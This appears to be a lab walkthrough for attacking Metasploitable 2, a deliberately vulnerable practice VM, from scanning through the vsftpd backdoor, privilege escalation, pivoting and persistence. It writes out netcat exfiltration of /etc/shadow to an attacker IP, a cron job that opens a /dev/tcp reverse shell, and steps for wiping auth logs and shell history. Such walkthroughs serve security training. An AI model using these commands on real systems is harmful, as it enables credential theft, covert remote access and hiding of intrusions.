# Metasploitable 2

This document outlines an advanced hacking approach for Metasploitable 2, involving multiple phases such as reconnaissance, manual exploitation, privilege escalation, and post-exploitation.

## 1. Reconnaissance (Information Gathering)

### Active and Passive Scanning:

Use `nmap`, `netcat`, and `whois` to identify open ports, services, and OS details.

```
nmap -A -sV <target IP>
```

- Use `nikto` or `dirb` for web vulnerability scanning.
- OS fingerprinting can be done with tools like `p0f` or `xprobe`.

### Service Enumeration:

Enumerate services such as:

- FTP (vsftpd) on port 21
- SSH (OpenSSH) on port 22
- Telnet on port 23
- SMTP on port 25
- HTTP (Apache) on port 80
- MySQL on port 3306
- RPCBind/NFS on port 111

Use tools like `enum4linux` for SMB enumeration or `hydra` for brute force attacks.

## 2. Vulnerability Assessment

Perform a vulnerability scan with `OpenVAS` or `Nessus` after mapping services.

Example vulnerability: **vsftpd v2.3.4 backdoor**.

## 3. Exploitation (Manual and Customized)

### vsftpd 2.3.4 Backdoor:

Manually exploit the backdoor using `netcat`:

```
nc <target IP> 6200
```

### Custom Buffer Overflow Exploit:

For advanced exploitation, analyze services like Apache Tomcat (port 8080) or MySQL for buffer overflow vulnerabilities. Use tools like `gdb` or `pwndbg` to craft a custom exploit.

## 4. Privilege Escalation

Once a low-privilege shell is obtained, escalate privileges.

### Kernel Exploits:

Look for kernel vulnerabilities like **dirty cow** or `udev` exploits.

### Search for SUID Binaries:

```
find / -perm -u=s -type f 2>/dev/null
```

### Misconfigurations:

Check for misconfigured services (e.g., NFS, sudo permissions).

## 5. Pivoting and Lateral Movement

After gaining initial access, pivot within the network using SSH pivoting or port forwarding.

### SSH Pivoting Example:

```
ssh -L <local_port>:<target_IP>:<target_service_port> <user>@<compromised_host>
```

### Metasploit Route Setup (Post-Exploitation):

```
run autoroute -s <target IP>
```

## 6. Post-Exploitation

### Dump Passwords:

Use tools like `hashdump` or `mimikatz` to retrieve stored passwords or hashes.

### Gather Sensitive Data:

Retrieve SSH keys, database files, and system credentials.

### Data Exfiltration Using Netcat:

```
nc -lvp 4444 > file.txt
cat /etc/shadow | nc <attacker IP> 4444
```

## 7. Covering Tracks

Securely delete sensitive files and logs to remove traces of the attack.

### Clear Logs:

- `/var/log/auth.log`
- `.bash_history`

Use `shred` or `dd` to securely delete files.

## 8. Persistence

To maintain access, plant a backdoor or create a new account.

### Add a Cron Job for Backdoor:

```
echo "_/5 _ \* \* \* /bin/bash -i >& /dev/tcp/<attacker IP>/4444 0>&1" >> /etc/crontab
```

## Conclusion

This methodology goes beyond simple Metasploit usage by manually exploiting vulnerabilities, escalating privileges, pivoting through networks, and ensuring persistence and stealth. Follow these steps to simulate a more complex attack on Metasploitable 2.
